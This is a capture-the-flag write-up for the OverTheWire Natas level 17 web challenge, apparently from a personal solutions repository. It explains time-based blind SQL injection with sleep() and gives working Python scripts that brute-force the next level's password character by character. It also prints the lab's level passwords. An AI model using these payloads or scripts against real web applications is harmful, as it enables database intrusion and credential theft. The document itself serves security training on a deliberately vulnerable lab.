# Level 16 → Level 17

## Details
Username: `natas17`<br />
Password: `XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd`<br />
URL:      http://natas17.natas.labs.overthewire.org

## Solution

<img src="./0.png"></img>

<img src="./1.png"></img>

Very similar to the stage **level14 to level15** but the difference is that there is no output for control needs. If so, the only thing that will be available to us now is - time. We will create a query so that if the password is in the correct format, we will wait a few seconds. By the time the answer is returned we will know what happened and act accordingly.

It took me a while to get the right string, and finally it turned out that `natas18" and sleep(10);-- -` works correctly. That means the answer will be delayed for about 10 seconds.

For example, the input `natas18" and password like binary "%4%" and sleep(10);-- -` will return after 10 seconds, while `natas18" and password like binary "%3%" and sleep(10);- - -` will return after a moment. This means that the digit '4' will appear in the password, and the digit '3' will not appear. That is, if when running the query we reached `sleep()`, that means we passed all the conditions of the Boolean AND operator.

We will now create a code that identifies all the characters that appear in the password (so as not to waste unnecessary time during its discovery later):

```python
from requests import get
from requests.auth import HTTPBasicAuth
from string import digits, ascii_letters

# Current level details
natas17_username = "natas17"
natas17_password = "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd"

# The sql injection time based input:
waiting_time = 3 # seconds
sql_injection_time_based = "natas18\" and password like binary \"%{}%\" and sleep(" + str(waiting_time) + ");-- -"

# GET HTTP details
URL = "http://natas17.natas.labs.overthewire.org/?username={}"
AUTH = HTTPBasicAuth(natas17_username, natas17_password)

characters_in_use = []
for c in digits + ascii_letters:
    res = get(url=URL.format(sql_injection_time_based.format(c)), auth=AUTH)
    
    if(res.elapsed.seconds >= waiting_time):
        characters_in_use.append(c)
        print("The password contains the following characters: " + ",".join(characters_in_use))
```

This is the resoult:

<img src="./2.png"></img>

Now we can run the brute force on the relevant characters only:

```python
from requests import get
from requests.auth import HTTPBasicAuth
from string import digits, ascii_letters

# Current level details
natas17_username = "natas17"
natas17_password = "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd"

# The sql injection time based input:
waiting_time = 3 # seconds
sql_injection_time_based = "natas18\" and password like binary \"{}%\" and sleep(" + str(waiting_time) + ");-- -"
relevant_characters = ['4','6','8','a','g','k','n','o','q','u','v','w','x','D','E','F','G','J','L','N','P','Q','U','V','Z']
password = ""
password_length = 32

# GET HTTP details
URL = "http://natas17.natas.labs.overthewire.org/?username={}"
AUTH = HTTPBasicAuth(natas17_username, natas17_password)

for _ in range(password_length):
    for c in relevant_characters:
        res = get(url=URL.format(sql_injection_time_based.format(password+c)), auth=AUTH)
        
        if(res.elapsed.seconds >= waiting_time):
            password += c
            print("Password: " + password.ljust(password_length, "_"))
            break
```

<img src="./3.png"></img>

And this is the password.


## Password for the next level:
```
8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq
```

## Appendix

The following code sums it all up. Copy it into a Python file and run it. Enjoy:

```python
from requests import get
from requests.auth import HTTPBasicAuth
from string import digits, ascii_letters

# Current level details
natas17_username = "natas17"
natas17_password = "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd"
natas18_password = ""
password_length = 32
characters_in_use = []

# The sql injection time based input:
waiting_time = 3 # seconds
sql_injection_recover_charecters = "natas18\" and password like binary \"%{}%\" and sleep(" + str(waiting_time) + ");-- -"
sql_injection_recover_password = "natas18\" and password like binary \"{}%\" and sleep(" + str(waiting_time) + ");-- -"

# GET HTTP details
URL = "http://natas17.natas.labs.overthewire.org/?username={}"
AUTH = HTTPBasicAuth(natas17_username, natas17_password)

# Recover relevant characters
for c in digits + ascii_letters:
    res = get(url=URL.format(sql_injection_recover_charecters.format(c)), auth=AUTH)

    if(res.elapsed.seconds >= waiting_time):
        characters_in_use.append(c)
        print("The password contains the following characters: " + ",".join(characters_in_use))

# Revover the password
for _ in range(password_length):
    for c in characters_in_use:
        res = get(url=URL.format(sql_injection_recover_password.format(natas18_password+c)), auth=AUTH)
        
        if(res.elapsed.seconds >= waiting_time):
            natas18_password += c
            print("Password: " + natas18_password.ljust(password_length, "_"))
            break

print("Password for natas18 is: " + natas18_password)
```
